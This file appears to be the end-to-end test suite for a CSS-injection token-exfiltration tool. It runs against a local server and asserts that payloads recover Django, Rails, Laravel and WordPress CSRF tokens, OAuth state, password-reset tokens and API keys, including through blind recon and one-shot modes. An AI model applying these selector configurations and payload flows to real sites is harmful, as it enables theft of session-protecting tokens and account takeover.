'use strict';

// End-to-end tests over the real HTTP endpoints using markup modelled on
// tokens as real web frameworks actually ship them: Django's
// `csrfmiddlewaretoken`, Rails' `authenticity_token` and `<meta csrf-token>`,
// Laravel's `_token`, WordPress `_wpnonce`, OAuth `state`/`nonce` params,
// password-reset links and JWT-style API keys. Each scenario embeds a random
// token of the right charset and length in a realistic value/page, replays the
// requests the live payload would fire (in random order) and asserts the
// server recovers the token. Between them they cover every option Frag exposes:
// anchor vs hidden input, every charset, both hex window sizes, both hidden
// hosts, custom start/end context and attributes, and blind mode's recon,
// extract and one-shot flows with their hosts and charset detection.
//
// Runs are seeded; set FRAG_SEED=<n> to try a different set of tokens.

process.env.FRAG_SETTLE_MS = '80';

const test = require('node:test');
const assert = require('node:assert/strict');

const { app, PRESETS } = require('../server');
const { generateCSS, pathChunk, charsetOf, alphabetOf, CHARSETS } = require('../public/payload');
const { SEED, rng, leak, parsePayload } = require('./helpers');
const B = require('../public/blind');
const { el, page, requests } = require('./blind-helpers');

const SETTLE_MS = Number(process.env.FRAG_SETTLE_MS);
const sleep = ms => new Promise(r => setTimeout(r, ms));

let server;
let base;
const realLog = console.log;

test.before(async () => {
  console.log = () => {}; // the server narrates every request
  server = app.listen(0);
  await new Promise(r => server.once('listening', r));
  base = `http://127.0.0.1:${server.address().port}`;
});

test.after(() => {
  console.log = realLog;
  server.close();
});

// A random token in a charset, as a real framework would mint it (base64
// padding only ever ends a value, so it's dropped from the random body).
const charsOf = charset => alphabetOf(charsetOf(charset)).replace(charset === 'base64' ? '=' : '', '');
const randomToken = (r, charset, length) => r.chars(charsOf(charset), length);

const listed = (result, token) =>
  result.status === 'ok' && (result.candidates || [result.token]).includes(token);

// --- targeted mode -----------------------------------------------------------

async function configure(user) {
  const res = await fetch(base + '/api/config', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(user),
  });
  return parsePayload(generateCSS(await res.json(), base));
}

const send = ({ t, c }) => fetch(`${base}/${t === 'm' ? '' : t + '/'}${pathChunk(c)}`).then(r => r.arrayBuffer());
const getToken = () => fetch(base + '/api/token').then(r => r.json());

// Replay, in random order, every request the payload fires for `value`.
async function extractTargeted(r, rules, value) {
  const { requests: reqs } = leak(rules, value);
  for (const req of r.shuffle(reqs)) await send(req);
  await sleep(SETTLE_MS + 60);
  return getToken();
}

// Base64/base64url tokens as frameworks mint them: include the symbols the
// charset is defined by, with base64 padding only at the end, to a fixed length.
function symbolToken(r, charset, length) {
  if (charset === 'base64') return 'a/B+' + randomToken(r, 'base64', length - 6) + '==';
  if (charset === 'base64url') return 'a-B_' + randomToken(r, 'base64url', length - 4);
  return randomToken(r, charset, length);
}

// Each case: the real HTML it models, the Frag config (the token's length is
// fixed so a single config serves every iteration), and a builder that places
// a fresh token of that length in a realistic value. `single` marks cases a
// clean 4-char-hex whole value recovers as exactly one answer; the rest only
// promise the real token is among the listed candidates.
const TARGETED = [
  {
    name: 'Rails hidden authenticity_token (base64)',
    // <form method="post"><input type="hidden" name="authenticity_token"
    //   value="<40-char base64>"> ... </form>
    length: 40,
    user: {
      selector: 'input[type="hidden"][name="authenticity_token"]', attribute: 'value',
      tokenName: 'authenticity_token', startSelector: '', endSelector: '', charset: 'base64', windowSize: 3, hostMode: 'has',
    },
    make: (r, L) => { const t = symbolToken(r, 'base64', L); return { value: t, token: t }; },
  },
  {
    name: 'Django csrfmiddlewaretoken (64-char alphanumeric, next-sibling host)',
    // <input type="hidden" name="csrfmiddlewaretoken" value="<64 alnum>">
    length: 64,
    user: {
      selector: 'input[type="hidden"][name="csrfmiddlewaretoken"]', attribute: 'value',
      tokenName: 'csrfmiddlewaretoken', startSelector: '', endSelector: '', charset: 'alnum', windowSize: 3, hostMode: 'sibling',
    },
    make: (r, L) => { const t = randomToken(r, 'alnum', L); return { value: t, token: t }; },
  },
  {
    name: 'Laravel _token (40-char alphanumeric, html:has host)',
    // <input type="hidden" name="_token" value="<40 alnum>" autocomplete="off">
    length: 40,
    user: {
      selector: 'input[type="hidden"][name="_token"]', attribute: 'value',
      tokenName: '_token', startSelector: '', endSelector: '', charset: 'alnum', windowSize: 3, hostMode: 'has',
    },
    make: (r, L) => { const t = randomToken(r, 'alnum', L); return { value: t, token: t }; },
  },
  {
    name: 'WordPress _wpnonce hidden input (10-char hex, 3-char windows)',
    // <input type="hidden" id="_wpnonce" name="_wpnonce" value="0a1b2c3d4e">
    // A fixed nonce whose 3-grams are all distinct, so the small 3-char-window
    // payload still pins it to a single answer.
    length: 10,
    user: {
      selector: 'input[type="hidden"][name="_wpnonce"]', attribute: 'value',
      tokenName: '_wpnonce', startSelector: '', endSelector: '', charset: 'hex', windowSize: 3, hostMode: 'sibling',
    },
    single: true,
    make: () => ({ value: '0a1b2c3d4e', token: '0a1b2c3d4e' }),
  },
  {
    name: 'Generic session CSRF, hidden input (40-char hex, 4-char windows, html:has host)',
    // <input type="hidden" name="csrf" value="<40 hex>">
    length: 40,
    user: { ...PRESETS.hidden, windowSize: 4, hostMode: 'has' },
    make: (r, L) => { const t = r.hex(L); return { value: t, token: t }; },
  },
  {
    name: 'Password-reset anchor, token param (40-char hex, 4-char windows)',
    // <a href="https://app.example.com/account/reset?token=<40 hex>&uid=8842">
    length: 40,
    user: {
      selector: 'a[href^="https://app.example.com/account/reset?"]', attribute: 'href',
      tokenName: 'reset token', startSelector: 'token=', endSelector: '&uid=',
      charset: 'hex', windowSize: 4,
    },
    make: (r, L) => {
      const t = r.hex(L);
      return { value: `https://app.example.com/account/reset?token=${t}&uid=${r.int(1000, 99999)}`, token: t };
    },
  },
  {
    name: 'OAuth authorize link, state param (base64url) with another param after it',
    // <a href="https://auth.example.com/oauth/authorize?state=<token>&nonce=...
    //   &client_id=svc-web&redirect_uri=...&scope=openid+profile">
    length: 32,
    user: {
      selector: 'a[href^="https://auth.example.com/oauth/authorize?state="]', attribute: 'href',
      tokenName: 'oauth state', startSelector: 'state=', endSelector: '&nonce=',
      charset: 'base64url', windowSize: 3,
    },
    make: (r, L) => {
      const t = symbolToken(r, 'base64url', L);
      const href = 'https://auth.example.com/oauth/authorize?state=' + t +
        '&nonce=' + randomToken(r, 'base64url', 16) +
        '&client_id=svc-web&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback&scope=openid+profile';
      return { value: href, token: t };
    },
  },
  {
    name: 'Email verification anchor with random hex junk after the token (4-char windows)',
    // <a href="https://example.com/m/callback/email?token=<40 hex>&operation=login&...&ref=<junk>">
    length: 40,
    user: { ...PRESETS.anchor, windowSize: 4 },
    make: (r, L) => {
      const t = r.hex(L);
      const href = 'https://example.com/m/callback/email?token=' + t +
        '&operation=login&state=medium&rememberMe=false&ref=' + r.hex(r.int(4, 40));
      return { value: href, token: t };
    },
  },
  {
    name: 'Prefixed, signed cookie-style value (custom start/end) in a hidden input',
    // <input type="hidden" name="state" value="v2:<24 hex>:sig">
    length: 24,
    user: {
      selector: 'input[type="hidden"][name="state"]', attribute: 'value',
      tokenName: 'signed state', startSelector: 'v2:', endSelector: ':sig',
      charset: 'hex', windowSize: 4, hostMode: 'has',
    },
    single: true,
    make: (r, L) => { const t = r.hex(L); return { value: `v2:${t}:sig`, token: t }; },
  },
  {
    name: 'Token carried in a non-standard attribute (data-href, 4-char windows)',
    // <a class="js-confirm" data-href="https://example.com/confirm?code=<16 hex>&lang=en">
    length: 16,
    user: {
      selector: 'a[data-href^="https://example.com/confirm?"]', attribute: 'data-href',
      tokenName: 'confirm code', startSelector: 'code=', endSelector: '&lang=',
      charset: 'hex', windowSize: 4,
    },
    single: true,
    make: (r, L) => {
      const t = r.hex(L);
      return { value: `https://example.com/confirm?code=${t}&lang=en`, token: t };
    },
  },
];

for (const sc of TARGETED) {
  test(`targeted: ${sc.name}`, async t => {
    const r = rng(SEED ^ hash(sc.name));
    const rules = await configure({ ...sc.user, tokenLength: sc.length });
    for (let i = 0; i < 3; i++) {
      const { value, token } = sc.make(r, sc.length);
      const result = await extractTargeted(r, rules, value);
      assert.equal(result.status, 'ok', `${value}: ${JSON.stringify(result)}`);
      assert.ok(listed(result, token), `${token}: ${JSON.stringify(result)}`);
      assert.notEqual(result.caseUnresolved, true, `case unresolved for ${token}`);
      if (sc.single) assert.equal(result.candidates, undefined, `expected a single answer for ${token}`);
    }
  });
}

// --- blind recon + extract ---------------------------------------------------

const getJson = path => fetch(base + path).then(r => r.json());
const postJson = (path, body) => fetch(base + path, {
  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
}).then(r => r.json());
const hit = path => fetch(`${base}/${path}`).then(r => r.arrayBuffer());

async function fire(doc, payload) {
  const r = rng(SEED + 99);
  for (const p of r.shuffle([...requests(doc, payload)])) await hit(p);
  await sleep(SETTLE_MS + 60);
}

test('blind recon + extract: a realistic authenticated app page', async () => {
  // A logged-in dashboard: nav, a search form, a logout form carrying a
  // Rails-style CSRF input, a <meta csrf-token>, an analytics data attribute,
  // and an "invite a teammate" link with a signed token param.
  //
  // <head>
  //   <meta charset="utf-8">
  //   <meta name="viewport" content="width=device-width, initial-scale=1">
  //   <meta name="csrf-token" content="<40 hex>">
  // </head>
  // <body data-user-id="88421">
  //   <nav><a href="/dashboard">Home</a><a href="/settings">Settings</a></nav>
  //   <form action="/search" method="get"><input type="search" name="q"></form>
  //   <form action="/logout" method="post">
  //     <input type="hidden" name="authenticity_token" value="<40 hex>">
  //     <button>Log out</button>
  //   </form>
  //   <a href="/team/invite?token=<32 base64url>&role=member">Invite</a>
  //   <div class="widget" data-api-key="<43 base64url>"></div>
  // </body>
  await getJson('/api/blind/reset');
  const r = rng(SEED + 40);
  const metaCsrf = r.hex(40);
  const formCsrf = r.hex(40);
  const inviteToken = randomToken(r, 'base64url', 32);
  // Contains "-" and "_", so recon classifies it as base64url, not plain alnum.
  const apiKey = symbolToken(r, 'base64url', 43);

  const logoutForm = el('form', { action: '/logout', method: 'post' });
  const doc = page([
    el('meta', { charset: 'utf-8' }),
    el('meta', { name: 'viewport', content: 'width=device-width, initial-scale=1' }),
    el('meta', { name: 'csrf-token', content: metaCsrf }),
    el('a', { href: '/dashboard' }),
    el('a', { href: '/settings' }),
    el('form', { action: '/search', method: 'get' }),
    el('input', { type: 'search', name: 'q', value: '' }),
    logoutForm,
    el('input', { type: 'hidden', name: 'authenticity_token', value: formCsrf }, { form: logoutForm }),
    el('a', { href: `/team/invite?token=${inviteToken}&role=member` }),
    el('div', { class: 'widget', 'data-api-key': apiKey }),
  ]);

  // Recon finds every wordlist field, its host and (for whole values) charset.
  await fire(doc, B.reconPayload());
  const found = await getJson('/api/recon');
  assert.equal(found.status, 'ok');
  assert.deepEqual(found.fields, [
    { kind: 'input', name: 'authenticity_token', host: 'form', charset: 'hex' },
    { kind: 'meta', name: 'csrf-token', host: 'self', charset: 'hex' },
    { kind: 'a', name: 'token', host: 'self', charset: null },
    { kind: 'data', name: 'data-api-key', host: 'self', charset: 'base64url' },
  ]);

  // Pick every field; the URL param's charset isn't probed, so set it.
  const chosen = found.fields.map(f => ({
    ...f, windowSize: 4, charset: f.kind === 'a' ? 'base64url' : f.charset,
  }));
  const { fields } = await postJson('/api/blind', { fields: chosen });
  await fire(doc, B.extractPayload(fields));
  const { results } = await getJson('/api/blind/tokens');

  const byName = Object.fromEntries(results.map(x => [x.name, x]));
  assert.ok(listed(byName.authenticity_token, formCsrf), JSON.stringify(byName.authenticity_token));
  assert.ok(listed(byName['csrf-token'], metaCsrf), JSON.stringify(byName['csrf-token']));
  assert.ok(listed(byName.token, inviteToken), JSON.stringify(byName.token));
  assert.ok(listed(byName['data-api-key'], apiKey), JSON.stringify(byName['data-api-key']));
});

test('blind recon: an input whose name is outside the wordlist is flagged, not extracted', async () => {
  // <form action="/transfer"><input type="hidden" name="xyzzy_guard" value="...">
  //   <input type="hidden" name="csrf_token" value="<40 hex>"></form>
  await getJson('/api/blind/reset');
  const r = rng(SEED + 41);
  const csrf = r.hex(40);
  const form = el('form', { action: '/transfer' });
  const doc = page([
    form,
    el('input', { type: 'hidden', name: 'xyzzy_guard', value: r.hex(16) }, { form }),
    el('input', { type: 'hidden', name: 'csrf_token', value: csrf }, { form }),
  ]);
  await fire(doc, B.reconPayload());
  const found = await getJson('/api/recon');
  assert.deepEqual(found.fields.map(f => f.name), ['csrf_token']);
  assert.equal(found.unlistedInputs, true);

  const { fields } = await postJson('/api/blind', { fields: found.fields.map(f => ({ ...f, windowSize: 4 })) });
  await fire(doc, B.extractPayload(fields));
  assert.ok(listed((await getJson('/api/blind/tokens')).results[0], csrf));
});

// --- blind one-shot ----------------------------------------------------------

test('blind one-shot: one injection pulls a token from each kind of field', async () => {
  // A single static stylesheet discovers and extracts, one field per kind:
  //   <input type="hidden" name="csrf_token" value="<alnum>">   (Django-ish)
  //   <meta name="csrf-token" content="<base64>">               (Rails)
  //   <a href="/download?code=<40 hex>&expires=...">            (signed link)
  //   <form action="/newsletter?state=<40 hex>">                (form action)
  //   <span data-api-key="<base64url>">                         (JS widget key)
  await getJson('/api/blind/reset');
  const cfg = {
    targets: B.TARGETS, urlKinds: ['a', 'form'],
    dataNames: B.ONE_SHOT_DATA_NAMES, urlCharset: 'hex', urlWindow: 4,
  };
  const { fields } = await postJson('/api/blind/one-shot', cfg);
  const r = rng(SEED + 42);
  const secret = {
    input: randomToken(r, 'alnum', 40),
    meta: 'Qd3/' + randomToken(r, 'base64', 36) + '==',
    a: r.hex(40),
    form: r.hex(24),
    data: randomToken(r, 'base64url', 43),
  };
  const form = el('form', { action: `/newsletter?state=${secret.form}&src=footer` });
  const doc = page([
    form,
    el('input', { type: 'hidden', name: 'csrf_token', value: secret.input }, { form }),
    el('meta', { name: 'csrf-token', content: secret.meta }),
    el('a', { href: `/download?code=${secret.a}&expires=1792531200` }),
    el('span', { 'data-api-key': secret.data }),
  ]);

  await fire(doc, B.oneShotPayload(fields, cfg));
  const { results } = await getJson('/api/blind/tokens');
  for (const result of results.filter(x => Object.hasOwn(secret, x.kind))) {
    assert.equal(result.status, 'ok', JSON.stringify(result));
    assert.ok(listed(result, secret[result.kind]), JSON.stringify(result));
  }
});

test('blind one-shot: a chosen shortlist of names finds the one that is present', async () => {
  // Only `nonce` of the shortlist is on the page, as a short WordPress-style
  // hidden nonce. The other names simply don't match.
  await getJson('/api/blind/reset');
  const cfg = {
    targets: ['input'], inputNames: ['csrf', 'token', '_wpnonce', 'nonce', 'authenticity_token'],
    dataNames: [], urlCharset: 'hex', urlWindow: 4,
  };
  const { fields } = await postJson('/api/blind/one-shot', cfg);
  const r = rng(SEED + 43);
  const nonce = r.hex(10);
  const doc = page([
    el('input', { type: 'text', name: 'log', value: '' }),
    el('input', { type: 'password', name: 'pwd', value: '' }),
    el('input', { type: 'hidden', name: 'nonce', value: nonce }),
    el('input', { type: 'hidden', name: 'redirect_to', value: '/wp-admin/' }),
  ]);
  await fire(doc, B.oneShotPayload(fields, cfg));
  const result = (await getJson('/api/blind/tokens')).results[0];
  assert.equal(result.name, 'nonce');
  assert.ok(listed(result, nonce), JSON.stringify(result));
});

function hash(s) {
  let h = 0;
  for (const ch of s) h = (Math.imul(h, 31) + ch.charCodeAt(0)) | 0;
  return h;
}
